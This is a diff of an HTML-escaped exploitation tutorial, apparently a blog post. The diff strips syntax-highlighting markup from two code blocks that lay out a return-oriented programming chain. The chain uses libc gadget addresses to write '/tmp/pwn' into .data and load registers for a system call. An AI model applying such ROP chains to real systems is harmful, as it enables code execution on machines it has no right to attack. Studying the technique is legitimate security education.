@@ -149,34 +149,34 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 
 
 &lt;p&gt;We need to setup our stack as follows using the &lt;code&gt;libc&lt;/code&gt; base of &lt;code&gt;0xb7e97000&lt;/code&gt;. &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;lower memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="kc"&gt;...&lt;/span&gt;
-&lt;span class="c1"&gt;# Load the target address in .data&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049710&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data
-&lt;span class="c1"&gt;# Load the first part of our string &amp;quot;/tmp&amp;quot; into edx&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;quot;/tmp&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; First part of our string &lt;span class="o"&gt;/&lt;/span&gt;tmp
-&lt;span class="c1"&gt;# Perform to move from edx to the .data segment&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# Load the next target address in .data&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049714&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; bytes
-&lt;span class="c1"&gt;# Load the second part of our string &amp;quot;/pwn&amp;quot; into edx &lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;quot;/pwn&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Second part of our string &lt;span class="o"&gt;/&lt;/span&gt;pwn
-&lt;span class="c1"&gt;# Perform the move to .data&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# Load the final target address in .data&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; bytes
-&lt;span class="c1"&gt;# Load the NULL into edx &lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="mh"&gt;0x00000000&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="kc"&gt;NULL&lt;/span&gt; bytes
-&lt;span class="c1"&gt;# Perform the move to .data&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="kc"&gt;...&lt;/span&gt;
-&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;higher memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&amp;lt;lower memory&amp;gt;
+...
+# Load the target address in .data
+    0xb7fcc19d &amp;lt;- Return address (pop ecx; ret)
+    0x08049710 &amp;lt;- Target memory address in .data
+# Load the first part of our string &amp;quot;/tmp&amp;quot; into edx
+    0xb7e98a9e &amp;lt;- Return address (pop edx; ret)
+    &amp;quot;/tmp&amp;quot; &amp;lt;- First part of our string /tmp
+# Perform to move from edx to the .data segment
+    0xb7f0b997 &amp;lt;- Return address (mov dword [ecx], edx; ret)
+# Load the next target address in .data
+    0xb7fcc19d &amp;lt;- Return address (pop ecx; ret)
+    0x08049714 &amp;lt;- Target memory address in .data + 4 bytes
+# Load the second part of our string &amp;quot;/pwn&amp;quot; into edx 
+    0xb7e98a9e &amp;lt;- Return address (pop edx; ret)
+    &amp;quot;/pwn&amp;quot; &amp;lt;- Second part of our string /pwn
+# Perform the move to .data
+    0xb7f0b997 &amp;lt;- Return address (mov dword [ecx], edx; ret)
+# Load the final target address in .data
+    0xb7fcc19d &amp;lt;- Return address (pop ecx; ret)
+    0x08049718 &amp;lt;- Target memory address in .data + 4 bytes
+# Load the NULL into edx 
+    0xb7e98a9e &amp;lt;- Return address (pop edx; ret)
+    0x00000000 &amp;lt;- NULL bytes
+# Perform the move to .data
+    0xb7f0b997 &amp;lt;- Return address (mov dword [ecx], edx; ret)
+...
+&amp;lt;higher memory&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -190,15 +190,15 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 
 
 &lt;p&gt;Here we've found all three in a single gadget. Awesome! Let's add the following to our stack layout.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;lower memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="kc"&gt;...&lt;/span&gt;
-&lt;span class="c1"&gt;# Load registers&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7f6fa81&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; pop ecx&lt;span class="p"&gt;;&lt;/span&gt; pop ebx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;3&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; edx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="kc"&gt;NULL&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;2&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; ecx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="kc"&gt;NULL&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049710&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;1&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; ebx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="s"&gt;&amp;quot;/tmp/pwn&amp;quot;&lt;/span&gt;
-&lt;span class="kc"&gt;...&lt;/span&gt;
-&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;higher memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&amp;lt;lower memory&amp;gt;
+...
+# Load registers
+    0xb7f6fa81 &amp;lt;- Return address (pop edx; pop ecx; pop ebx; ret)
+    0x08049718 &amp;lt;- Argument 3 destined for edx - address of NULL
+    0x08049718 &amp;lt;- Argument 2 destined for ecx - address of NULL
+    0x08049710 &amp;lt;- Argument 1 destined for ebx - address of &amp;quot;/tmp/pwn&amp;quot;
+...
+&amp;lt;higher memory&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
